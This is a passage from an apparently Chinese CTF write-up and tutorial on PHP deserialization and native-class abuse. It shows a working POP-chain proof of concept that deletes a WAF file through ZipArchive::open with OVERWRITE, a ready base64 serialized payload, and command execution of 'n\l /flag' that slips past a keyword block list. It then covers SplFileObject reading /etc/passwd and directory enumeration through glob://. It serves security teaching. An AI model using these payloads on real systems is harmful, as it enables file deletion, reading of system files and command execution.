<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shell</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>)&lt;<span class="number">10</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;so long!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>联合index.php里面的Open类：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;waf.txt&#x27;</span>))&#123;    <span class="comment">// 当waf.txt没读取成功时才能得到flag</span></span><br><span class="line">            <span class="title function_ invoke__">shell</span>(<span class="variable">$content</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>.<span class="string">&quot;.php&quot;</span>);    <span class="comment">// filename=php://filter/read=convert.base64-encode/resource=shell</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可知我们只要使 <code>file_get_contents(&#39;waf.txt&#39;)</code> 读取失败就可以进入 <code>shell($content)</code> 来执行系统命令。所以我们应该要想办法将waf.txt这个文件删除，这样就会读取失败，才能执行我们的命令。</p>
<p>要删除waf.txt只能想到原生类了，并且这个原生类中要有一个open()方法。遍历一下能有删除功能函数：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;open&#x27;</span></span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>找到了一个ZipArchive类，其中刚好有一个open()方法刚好符合：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">ZipArchive</span>::<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>, <span class="variable">$flags</span> = <span class="literal">null</span>)</span><br></pre></td></tr></table></figure></div>

<p>如果设置flags参数的值为 <code>ZipArchive::OVERWRITE</code> 的话，可以把指定文件删除。这里我们跟进方法可以看到const OVERWRITE &#x3D; 8，也就是将OVERWRITE定义为了常量8，我们在调用时也可以直接将flags赋值为8。</p>
<p>所以我们利用ZipArchive原生类调用open方法，即可将即可将$filename（waf.txt）删除：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">ZipArchive</span>::<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>, <span class="title class_">ZipArchive</span>::<span class="variable constant_">OVERWRITE</span>)</span><br></pre></td></tr></table></figure></div>

<p>删除waf.txt的POC：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;    <span class="comment">// admin</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice=<span class="keyword">new</span> <span class="title function_ invoke__">login</span>(<span class="variable">$this</span>-&gt;file,<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice = <span class="keyword">new</span> <span class="title function_ invoke__">register</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;choice-&gt;<span class="title function_ invoke__">checking</span>(<span class="variable">$this</span>-&gt;username,<span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;   </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$poc</span> = <span class="keyword">new</span> <span class="title class_">Game</span>();</span><br><span class="line"><span class="variable">$poc</span>-&gt;username = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;password = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;register = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;file = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line"><span class="variable">$poc</span>-&gt;filename = <span class="string">&quot;waf.txt&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;content = <span class="title class_">ZipArchive</span>::<span class="variable constant_">OVERWRITE</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$poc</span>));</span><br></pre></td></tr></table></figure></div>

<p>生成payload：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086MTA6IlppcEFyY2hpdmUiOjU6e3M6Njoic3RhdHVzIjtpOjA7czo5OiJzdGF0dXNTeXMiO2k6MDtzOjg6Im51bUZpbGVzIjtpOjA7czo4OiJmaWxlbmFtZSI7czowOiIiO3M6NzoiY29tbWVudCI7czowOiIiO31zOjg6ImZpbGVuYW1lIjtzOjc6IndhZi50eHQiO3M6NzoiY29udGVudCI7aTo4O30=</span><br></pre></td></tr></table></figure></div>

<p>执行后，即可删除waf.txt。接下来就可以使用 <code>n\l /fla*</code> 执行命令读取flag了：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;    <span class="comment">// admin</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice=<span class="keyword">new</span> <span class="title function_ invoke__">login</span>(<span class="variable">$this</span>-&gt;file,<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice = <span class="keyword">new</span> <span class="title function_ invoke__">register</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;choice-&gt;<span class="title function_ invoke__">checking</span>(<span class="variable">$this</span>-&gt;username,<span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;   </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$poc</span> = <span class="keyword">new</span> <span class="title class_">Game</span>();</span><br><span class="line"><span class="variable">$poc</span>-&gt;username = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;password = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;register = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;file = <span class="keyword">new</span> <span class="title class_">Open</span>();</span><br><span class="line"><span class="variable">$poc</span>-&gt;filename = <span class="string">&quot;xxx&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;content = <span class="string">&quot;n\l /flag&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$poc</span>));</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t0189d659a6021df114.png"
                      alt="img"
                ></p>
<h2 id="PHP-原生文件操作类"><a href="#PHP-原生文件操作类" class="headerlink" title="PHP 原生文件操作类"></a>PHP 原生文件操作类</h2><h3 id="SPL"><a href="#SPL" class="headerlink" title="SPL"></a>SPL</h3><p>SPL就是Standard PHP Library的缩写。据手册显示，SPL是用于解决 <strong>典型问题(standard problems)</strong> 的一组接口与类的集合：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t012d329e81effcebb1.png"
                      alt="img"
                ></p>
<p>SPL 对 PHP 引擎进行了扩展，例如 ArrayAccess、Countable 和 SeekableIterator 等接口，它们用于以数组形式操作对象。同时，你还可以使用 RecursiveIterator、ArrayObejcts 等其他迭代器进行数据的迭代操作。它还内置几个的对象例如 Exceptions、SplObserver、Spltorage 以及 splautoloadregister、splclasses、iteratorapply 等的帮助函数（helper functions），用于重载对应的功能。这些工具聚合在一起就好比是把多功能的瑞士军刀，善用它们可以从质上提升 PHP 的代码效率。</p>
<p>因为SPL是要解决典型问题，免不了有一些处理文件的类。下面，我们简单的挑几个SPL中常用的文件处理原生类进行讲解，其他的等以后遇到了在添进来。</p>
<p><strong>SplFileObject 类</strong></p>
<p><strong>读文件poc</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$context = new SplFileObject(&#x27;/etc/passwd&#x27;);</span><br><span class="line">foreach($context as $f)&#123;</span><br><span class="line">    echo($f);</span><br><span class="line">&#125;</span><br><span class="line">// 或者用伪协议base64直接输出，有时候有奇效</span><br><span class="line">$context = new SplFileObject(&#x27;php://filter/read=convert.base64-encode/resource=/etc/passwd&#x27;);</span><br><span class="line">echo $context;</span><br></pre></td></tr></table></figure></div>

<p><strong>写文件poc</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$f = new SplFileObject(&#x27;./file&#x27;, &quot;w&quot;);</span><br><span class="line">$f-&gt;fwrite(&quot;file&quot;);</span><br></pre></td></tr></table></figure></div>



<h3 id="可遍历目录类"><a href="#可遍历目录类" class="headerlink" title="可遍历目录类"></a>可遍历目录类</h3><p>可遍历目录类有以下几个：</p>
<ul>
<li>DirectoryIterator 类</li>
<li>FilesystemIterator 类</li>
<li>GlobIterator 类</li>
</ul>
<h4 id="DirectoryIterator-类"><a href="#DirectoryIterator-类" class="headerlink" title="DirectoryIterator 类"></a><strong>DirectoryIterator 类</strong></h4><p>DirectoryIterator 类提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。</p>
<p><strong>类摘要：</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">DirectoryIterator</span> <span class="keyword">extends</span> <span class="built_in">SplFileInfo</span> <span class="keyword">implements</span> <span class="built_in">SeekableIterator</span> &#123;</span><br><span class="line">    <span class="comment">/* 方法 */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ( <span class="keyword">string</span> <span class="variable">$path</span> )</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">current</span> ( ) : <span class="built_in">DirectoryIterator</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">getATime</span> ( ) : <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">getBasename</span> ( <span class="keyword">string</span> <span class="variable">$suffix</span> = ? ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">getCTime</span> ( ) : <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">getExtension</span> ( ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">getFilename</span> ( ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">getGroup</span> ( ) : <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">getInode</span> ( ) : <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">getMTime</span> ( ) : <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">getOwner</span> ( ) : <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">getPath</span> ( ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">getPathname</span> ( ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">getPerms</span> ( ) : <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">getSize</span> ( ) : <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">getType</span> ( ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">isDir</span> ( ) : <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">isDot</span> ( ) : <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">isExecutable</span> ( ) : <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">isFile</span> ( ) : <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">isLink</span> ( ) : <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">isReadable</span> ( ) : <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">isWritable</span> ( ) : <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">key</span> ( ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">next</span> ( ) : <span class="keyword">void</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">rewind</span> ( ) : <span class="keyword">void</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">seek</span> ( <span class="keyword">int</span> <span class="variable">$position</span> ) : <span class="keyword">void</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__toString</span> ( ) : <span class="keyword">string</span>    <span class="comment">// 以字符串形式获取文件名</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">valid</span> ( ) : <span class="keyword">bool</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>利用 DirectoryIterator 类遍历指定目录里的文件：</strong></p>
<p>如果我们这样：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br></pre></td></tr></table></figure></div>

<p>会创建一个指定目录的迭代器。当执行到echo函数时，会触发DirectoryIterator类中的 <code>__toString()</code> 方法，输出指定目录里面经过排序之后的第一个文件名：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t01450036649a6441b8.png"
                      alt="img"
                ></p>
<p>循环输出所有文件</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>也可以配合glob:&#x2F;&#x2F;协议使用模式匹配来寻找我们想要的文件路径：</p>
<blockquote>
<p>glob:&#x2F;&#x2F; 协议用来查找匹配的文件路径模式</p>
</blockquote>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*flag*&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t0183f514766cb08688.png"
                      alt="img"
                ></p>
<p>如果想输出全部的文件名我们还需要对$dir对象进行遍历：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">    <span class="comment">//echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t014f2bccca7bfaf753.png"
                      alt="img"
                ></p>
<h4 id="FilesystemIterator-类"><a href="#FilesystemIterator-类" class="headerlink" title="FilesystemIterator 类"></a><strong>FilesystemIterator 类</strong></h4><p>FilesystemIterator 类与 DirectoryIterator 类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。</p>
<p>该类的使用方法与DirectoryIterator 类也是基本相同的：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t014a5b8a7a9da0bdd6.png"
                      alt="img"
                ></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&quot;glob:///*flag*&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t0147f9367e49509b6f.png"
                      alt="img"
                ></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">    <span class="comment">//echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t014ea784cc8f1cadcf.png"
                      alt="img"
                ></p>
<h4 id="GlobIterator-类"><a href="#GlobIterator-类" class="headerlink" title="GlobIterator 类"></a><strong>GlobIterator 类</strong></h4><p>与前两个类的作用相似，GlobIterator 类也可以遍历一个文件目录，使用方法与前两个类也基本相似。但与上面略不同的是其行为类似于 glob()，可以通过模式匹配来寻找文件路径。</p>
<p><strong>类摘要：</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">GlobIterator</span> <span class="keyword">extends</span> <span class="built_in">FilesystemIterator</span> <span class="keyword">implements</span> <span class="built_in">SeekableIterator</span> , <span class="built_in">Countable</span> &#123;</span><br><span class="line">    <span class="comment">/* 方法 */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ( <span class="keyword">string</span> <span class="variable">$pattern</span> , <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">KEY_AS_PATHNAME</span> | <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">CURRENT_AS_FILEINFO</span> )</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">count</span> ( ) : <span class="keyword">int</span></span><br><span class="line">    <span class="comment">/* 继承的方法 */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">__construct</span> ( <span class="keyword">string</span> <span class="variable">$path</span> , <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">KEY_AS_PATHNAME</span> | <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">CURRENT_AS_FILEINFO</span> | <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">SKIP_DOTS</span> )</span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">current</span> ( ) : <span class="keyword">mixed</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">getFlags</span> ( ) : <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">key</span> ( ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">next</span> ( ) : <span class="keyword">void</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">rewind</span> ( ) : <span class="keyword">void</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">setFlags</span> ( <span class="keyword">int</span> <span class="variable">$flags</span> = ? ) : <span class="keyword">void</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们知道，向下面这样在单纯的使用 DirectoryIterator 类和 FilesystemIterator 类且没有配合glob:&#x2F;&#x2F;协议进行匹配的时候：</p>
